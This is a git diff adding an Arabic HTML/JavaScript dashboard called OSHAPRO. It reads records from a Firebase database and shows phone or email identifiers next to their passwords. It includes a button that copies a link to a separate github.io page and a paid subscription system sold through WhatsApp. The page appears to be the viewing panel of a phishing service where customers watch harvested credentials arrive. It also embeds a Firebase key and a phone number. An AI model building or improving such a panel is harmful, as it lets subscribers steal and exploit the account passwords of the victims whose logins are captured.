@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSHAPRO - لوحة التحكم</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: #0b0d10; color: #e4e6eb; padding: 20px; min-height: 100vh; }
+        .container { max-width: 900px; margin: 0 auto; }
+        
+        .header { background: #181a20; padding: 20px 25px; border-radius: 20px; border: 1px solid #2c3038; margin-bottom: 25px; display: flex; flex-direction: column; gap: 18px; position: relative; }
+        .header-top { display: flex; justify-content: space-between; align-items: center; width: 100%; }
+        .header h1 { color: #0064e0; font-size: 22px; }
+        
+        .status-badge { background: rgba(0, 200, 83, 0.05); color: #00c853; padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: 500; border: 1px solid rgba(0, 200, 83, 0.2); display: flex; align-items: center; gap: 6px; }
+        
+        .search-box { display: flex; flex-direction: column; gap: 12px; width: 100%; }
+        .search-box input { background: #181a20; border: 1px solid #0064e0; border-radius: 14px; padding: 14px 18px; color: white; font-size: 14px; outline: none; width: 100%; text-align: center; }
+        
+        .search-buttons { display: flex; gap: 12px; width: 100%; }
+        .search-buttons button { flex: 1; border: none; color: white; padding: 14px 22px; border-radius: 14px; cursor: pointer; font-size: 14px; font-weight: 600; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        #loadBtn { background: #0064e0; }
+        #loadBtn:hover { background: #0050b3; }
+        .search-buttons .btn-refresh { background: #252a32; border: 1px solid #3a3f4a; color: #a0a5b1; }
+        .search-buttons .btn-refresh:hover { background: #303641; color: white; }
+        
+        .timer-bar { background: #1a2333; border: 1px solid #0064e0; border-radius: 16px; padding: 12px 20px; margin-bottom: 20px; justify-content: space-between; align-items: center; display: none; }
+        .timer-bar .timer-label { font-size: 14px; color: #8e96a3; font-weight: bold; }
+        .timer-bar .timer-clock { font-size: 18px; color: #00c853; font-weight: 700; font-family: monospace; letter-spacing: 1px; }
+
+        /* تنسيق زر نسخ الرابط الجديد */
+        .copy-link-btn { background: #252a32; border: 1px solid #3a3f4a; color: #fff; padding: 12px; border-radius: 16px; cursor: pointer; font-size: 14px; font-weight: 600; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; width: 100%; }
+        .copy-link-btn:hover { background: #303641; border-color: #0064e0; }
+
+        .user-info { background: #181a20; border: 1px solid #2c3038; border-radius: 16px; padding: 15px 25px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; }
+        .user-info .label { color: #8e96a3; font-size: 14px; display: flex; align-items: center; gap: 6px; }
+        .user-info .value { color: #0064e0; font-weight: bold; font-size: 15px; direction: ltr; background: rgba(0, 100, 224, 0.08); padding: 4px 10px; border-radius: 8px; }
+        
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; margin-bottom: 25px; }
+        .stat-card { background: #181a20; border: 1px solid #2c3038; border-radius: 16px; padding: 15px 20px; display: flex; flex-direction: column; }
+        .stat-card .label { color: #8e96a3; font-size: 13px; display: flex; align-items: center; justify-content: flex-start; gap: 6px; }
+        .stat-card .value { font-size: 26px; font-weight: 700; color: white; margin-top: 10px; text-align: left; }
+        
+        #feedContainer { display: flex; flex-direction: column; gap: 15px; }
+        .feed-item { background: #181a20; border: 1px solid #2c3038; border-radius: 16px; padding: 18px 22px; }
+        .feed-item .top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; padding-bottom: 8px; border-bottom: 1px solid #262b34; }
+        .feed-item .top .phone { color: #0064e0; font-weight: 600; }
+        .feed-item .password-display { font-size: 18px; padding: 12px 15px; color: #eef0f3; background: #121314; border-radius: 10px; border: 1px solid #2c3038; margin-top: 5px; }
+        .feed-item .password-display .password-text { color: #00c853; font-weight: 600; font-size: 20px; }
+        
+        .empty { text-align: center; padding: 50px 20px; background: #181a20; border-radius: 20px; border: 1.5px dashed #2c3038; color: #8e96a3; font-size: 14px; width: 100%; }
+        
+        .sub-block-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(10, 11, 14, 0.96); display: flex; justify-content: center; align-items: center; z-index: 99999; display: none; backdrop-filter: blur(8px); }
+        .sub-block-card { background: linear-gradient(145deg, #181a20 0%, #111216 100%); border: 1px solid rgba(255,255,255,0.08); border-top: 4px solid #ff4d6d; border-radius: 24px; padding: 35px 25px; max-width: 440px; width: 92%; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .sub-block-card .icon-shield { width: 70px; height: 70px; background: rgba(255, 77, 109, 0.1); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; color: #ff4d6d; font-size: 32px; }
+        .sub-block-card h2 { font-size: 24px; color: white; margin-bottom: 12px; font-weight: 700; }
+        .sub-block-card p { color: #a0a5b1; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
+        
+        .activation-form { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); padding: 20px; border-radius: 16px; margin-bottom: 25px; text-align: right; }
+        .activation-form label { font-size: 12px; color: #8e96a3; font-weight: bold; margin-bottom: 8px; display: block; }
+        .activation-form input { width: 100%; background: #121317; border: 1px solid #2c3038; padding: 14px; border-radius: 10px; color: white; font-size: 16px; font-family: monospace; text-align: center; letter-spacing: 2px; outline: none; transition: 0.3s; }
+        .activation-form input:focus { border-color: #0064e0; box-shadow: 0 0 10px rgba(0,100,224,0.2); }
+        .btn-submit-code { width: 100%; background: #0064e0; color: white; border: none; padding: 12px; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 12px; transition: 0.3s; }
+        
+        .btn-subscribe-whatsapp { background: transparent; color: #00c853; border: 1px solid rgba(0, 200, 83, 0.3); padding: 12px 25px; border-radius: 50px; font-size: 14px; font-weight: bold; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; gap: 10px; width: 100%; transition: 0.3s; }
+        .btn-subscribe-whatsapp:hover { background: rgba(0, 200, 83, 0.1); border-color: #00c853; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1d1e20; color: #f5f6f7; padding: 14px 28px; border-radius: 16px; border: 1px solid #32353a; display: none; z-index: 999999; text-align: center; }
+        .toast.show { display: block; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="header-top">
+            <h1>OSHAPRO /</h1>
+            <span class="status-badge">متصل بالنظام <i class="fas fa-toggle-on"></i></span>
+        </div>
+        <div class="search-box">
+            <input type="text" id="phoneInput" placeholder="📱 أدخل المعرف المسجل الخاص بك">
+            <div class="search-buttons">
+                <button id="loadBtn"><i class="fas fa-database"></i> عرض البيانات</button>
+                <button class="btn-refresh" id="refreshBtn"><i class="fas fa-sync-alt"></i> تحديث فوري</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="timer-bar" id="timerBar">
+        <span class="timer-label"><i class="fas fa-hourglass-half"></i> الوقت المتبقي لصلاحية الواجهة:</span>
+        <span class="timer-clock" id="timerClock">00:00</span>
+    </div>
+
+    <button class="copy-link-btn" id="copyLinkBtn">
+        <i class="fas fa-copy"></i> نسخ الرابط
+    </button>
+
+    <div class="user-info">
+        <span class="label"><i class="fas fa-user"></i> الحساب النشط حالياً:</span>
+        <span class="value" id="currentUser">لم يتم التحديد</span>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <div class="label"><i class="fas fa-box" style="color: #0064e0;"></i> الحصيلة الواردة</div>
+            <div class="value" style="color: white;"><span id="totalCount">0</span></div>
+        </div>
+        <div class="stat-card">
+            <div class="label"><i class="fas fa-clock" style="color: #00c853;"></i> آخر فحص حي</div>
+            <div class="value" style="font-size: 16px; color: white;"><span id="lastUpdate">--:--</span></div>
+        </div>
+    </div>
+
+    <div id="feedContainer">
+        <div class="empty"><p>الرجاء كتابة المعرف بالخانات العلوية لعرض الحصيلة</p>
+        </div>
+    </div>
+</div>
+
+<div class="sub-block-overlay" id="subBlockOverlay">
+    <div class="sub-block-card">
+        <div class="icon-shield"><i class="fas fa-lock"></i></div>
+        <h2>تحتاج اللوحة كود تفعيل نشط!</h2>
+        <p id="subModalText">انتهت الصلاحية المجانية. يرجى تفعيل الواجهة عبر كود تفعيل مدفوع.</p>
+        
+        <div class="activation-form">
+            <label><i class="fas fa-key"></i> إدخال كود التفعيل الممنوح لك:</label>
+            <input type="text" id="activationCodeInput" placeholder="ID-XXXXX" autocomplete="off">
+            <button class="btn-submit-code" id="btnSubmitCode">تفعيل لوحتي الفوري</button>
+        </div>
+
+        <a href="#" id="whatsappBtnLink" class="btn-subscribe-whatsapp" target="_blank">
+            <i class="fab fa-whatsapp"></i> تواصل لطلب كود اشتراك جديد
+        </a>
+    </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCdgV0Z35PJc968NaVhmhqqz4LGscyTZNQ",
+        authDomain: "oshapro-8edef.firebaseapp.com",
+        databaseURL: "https://oshapro-8edef-default-rtdb.firebaseio.com",
+        projectId: "oshapro-8edef",
+        storageBucket: "oshapro-8edef.appspot.com",
+        messagingSenderId: "353376835047",
+        appId: "1:353376835047:android:ac538f2f9da3c3f942d942"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const feedContainer = document.getElementById('feedContainer');
+    const totalCount = document.getElementById('totalCount');
+    const lastUpdate = document.getElementById('lastUpdate');
+    const currentUser = document.getElementById('currentUser');
+    const phoneInput = document.getElementById('phoneInput');
+    const loadBtn = document.getElementById('loadBtn');
+    const refreshBtn = document.getElementById('refreshBtn');
+    const toast = document.getElementById('toast');
+    const copyLinkBtn = document.getElementById('copyLinkBtn');
+
+    const timerBar = document.getElementById('timerBar');
+    const timerClock = document.getElementById('timerClock');
+    const subBlockOverlay = document.getElementById('subBlockOverlay');
+    const subModalText = document.getElementById('subModalText');
+    const whatsappBtnLink = document.getElementById('whatsappBtnLink');
+    const activationCodeInput = document.getElementById('activationCodeInput');
+    const btnSubmitCode = document.getElementById('btnSubmitCode');
+
+    let currentUserId = null;
+    let listenerRef = null;
+    let subCheckerInterval = null;
+
+    // وظيفة نسخ الرابط
+    copyLinkBtn.addEventListener('click', () => {
+        const url = "https://emadhamdy2004189-cell.github.io/OSHApro/osha3";
+        navigator.clipboard.writeText(url).then(() => {
+            showToast('✅ تم نسخ الرابط بنجاح!');
+        }).catch(() => {
+            showToast('❌ فشل نسخ الرابط.');
+        });
+    });
+
+    function showToast(text) {
+        toast.textContent = text;
+        toast.className = 'toast show';
+        setTimeout(() => { toast.classList.remove('show'); }, 3000);
+    }
+
+    function cleanIdentifier(input) {
+        if (input.includes('@')) return input.trim().toLowerCase();
+        return input.trim().replace(/[^0-9]/g, '');
+    }
+
+    function renderData(dataObj) {
+        if (!dataObj) {
+            feedContainer.innerHTML = `<div class="empty"><p>لا توجد أي بيانات مسجلة في هذا القسم حالياً.</p></div>`;
+            totalCount.textContent = '0';
+            return;
+        }
+
+        let html = '';
+        if (typeof dataObj === 'object') {
+            const keys = Object.keys(dataObj).filter(k => k !== '_user_info_');
+            if (keys.length > 0) {
+                let itemsArray = [];
+                keys.forEach((key) => {
+                    const item = dataObj[key];
+                    if (item && (item.password || item.identifier || typeof item === 'string')) {
+                        itemsArray.push({
+                            key: key,
+                            password: item.password || (typeof item === 'string' ? item : 'مجهول الكلمة'),
+                            identifier: item.identifier || currentUserId
+                        });
+                    }
+                });
+                if (itemsArray.length === 0 && (dataObj.password || dataObj.identifier)) {
+                    itemsArray.push({
+                        key: 'direct_field',
+                        password: dataObj.password || 'مجهول الكلمة',
+                        identifier: dataObj.identifier || currentUserId
+                    });
+                }
+                if (itemsArray.length > 0) {
+                    itemsArray.reverse().forEach((item) => {
+                        html += `<div class="feed-item">
+                            <div class="top"><span class="phone">📱 المسجل: ${item.identifier}</span></div>
+                            <div class="password-display">🔑 كلمة السر: <span class="password-text">${item.password}</span></div>
+                        </div>`;
+                    });
+                    feedContainer.innerHTML = html;
+                    totalCount.textContent = itemsArray.length;
+                } else {
+                    feedContainer.innerHTML = `<div class="empty"><p>لا توجد أي بيانات مسجلة في هذا القسم حالياً.</p></div>`;
+                    totalCount.textContent = '0';
+                }
+            } else {
+                feedContainer.innerHTML = `<div class="empty"><p>لا توجد أي بيانات مسجلة في هذا القسم حالياً.</p></div>`;
+                totalCount.textContent = '0';
+            }
+        } else {
+            html += `<div class="feed-item">
+                <div class="top"><span class="phone">📱 المسجل: ${currentUserId}</span></div>
+                <div class="password-display">🔑 البيانات المباشرة: <span class="password-text">${dataObj}</span></div>
+            </div>`;
+            feedContainer.innerHTML = html;
+            totalCount.textContent = '1';
+        }
+        lastUpdate.textContent = new Date().toLocaleTimeString('ar-EG');
+    }
+
+    function listenToUser(userId) {
+        if (listenerRef) listenerRef.off();
+        currentUser.textContent = userId;
+        listenerRef = database.ref(userId);
+        listenerRef.on('value', (snapshot) => { renderData(snapshot.val()); });
+        runSubscriptionSystem(userId);
+    }
+
+    function runSubscriptionSystem(userId) {
+        if (subCheckerInterval) clearInterval(subCheckerInterval);
+        timerBar.style.display = 'flex';
+        database.ref('_subscriptions_/' + userId).on('value', (snapshot) => {
+            const sub = snapshot.val();
+            let finalExpireAt = localStorage.getItem('_trial_time_' + userId);
+            let finalMessage = "انتهت صلاحية الـ 45 دقيقة التجريبية المجانية. يرجى تفعيل اشتراكك.";
+            if (sub) {
+                finalExpireAt = parseInt(sub.expireAt);
+                finalMessage = sub.endMessage || "انتهت صلاحية اللوحة الحالية.";
+            } else if (!finalExpireAt) {
+                finalExpireAt = Date.now() + (45 * 60 * 1000); 
+                localStorage.setItem('_trial_time_' + userId, finalExpireAt);
+            } else {
+                finalExpireAt = parseInt(finalExpireAt);
+            }
+            if (subCheckerInterval) clearInterval(subCheckerInterval);
+            subCheckerInterval = setInterval(() => {
+                const timeLeft = finalExpireAt - Date.now();
+                if (timeLeft <= 0) {
+                    clearInterval(subCheckerInterval);
+                    timerClock.textContent = "00:00";
+                    subModalText.textContent = finalMessage;
+                    
+                    // التعديل الخاص برسالة الواتساب الاحترافية
+                    const whatsappMessage = `مرحباً فريق دعم OSHApro 👋\nيسعدني التواصل معكم لطلب كود تفعيل جديد لتجديد اشتراكي في لوحة التحكم.\n\nالمعرف الخاص بي هو: ${userId}`;
+                    whatsappBtnLink.href = `https://wa.me/201009318466?text=${encodeURIComponent(whatsappMessage)}`;
+                    
+                    subBlockOverlay.style.display = 'flex';
+                } else {
+                    subBlockOverlay.style.display = 'none';
+                    const minutes = Math.floor(timeLeft / (1000 * 60));
+                    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                    timerClock.textContent = `${minutes < 10 ? '0' + minutes : minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+                }
+            }, 1000);
+        });
+    }
+
+    btnSubmitCode.addEventListener('click', function() {
+        const enteredCode = activationCodeInput.value.trim();
+        if(!enteredCode) {
+            showToast('⚠️ يرجى إدخال الكود أولاً');
+            return;
+        }
+        database.ref('_activation_codes_/' + enteredCode).once('value').then((snapshot) => {
+            const codeData = snapshot.val();
+            if(codeData && codeData.status === 'active') {
+                const now = Date.now();
+                const newExpireAt = now + (parseInt(codeData.durationMinutes) * 60 * 1000);
+                database.ref('_subscriptions_/' + currentUserId).set({
+                    expireAt: newExpireAt,
+                    endMessage: "انتهت فترة الاشتراك الممنوحة للكود الحالي.",
+                    activatedByCode: enteredCode
+                });
+                database.ref('_activation_codes_/' + enteredCode).update({
+                    status: 'used',
+                    usedBy: currentUserId,
+                    usedAt: now
+                });
+                showToast('✅ تم التفعيل الفوري للموقع!');
+                subBlockOverlay.style.display = 'none';
+                activationCodeInput.value = '';
+            } else {
+                showToast('❌ الكود الذي أدخلته منتهي أو غير صحيح!');
+            }
+        });
+    });
+
+    loadBtn.addEventListener('click', function() {
+        const input = phoneInput.value.trim();
+        if (!input) return;
+        currentUserId = cleanIdentifier(input);
+        listenToUser(currentUserId);
+        localStorage.setItem('savedUserId', input);
+    });
+
+    refreshBtn.addEventListener('click', () => { if (currentUserId) listenToUser(currentUserId); });
+
+    const savedUser = localStorage.getItem('savedUserId');
+    if (savedUser) { phoneInput.value = savedUser; loadBtn.click(); }
+</script>
+</body>
+</html>
